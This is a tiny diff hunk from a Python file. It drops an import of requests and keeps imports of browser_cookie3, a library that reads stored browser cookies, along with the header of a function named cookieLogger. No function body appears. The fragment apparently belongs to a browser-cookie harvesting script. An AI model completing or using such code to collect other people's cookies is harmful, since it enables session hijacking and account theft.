@@ -1,6 +1,5 @@
 import os
 import tempfile
-import requests
 import browser_cookie3
 
 def cookieLogger():
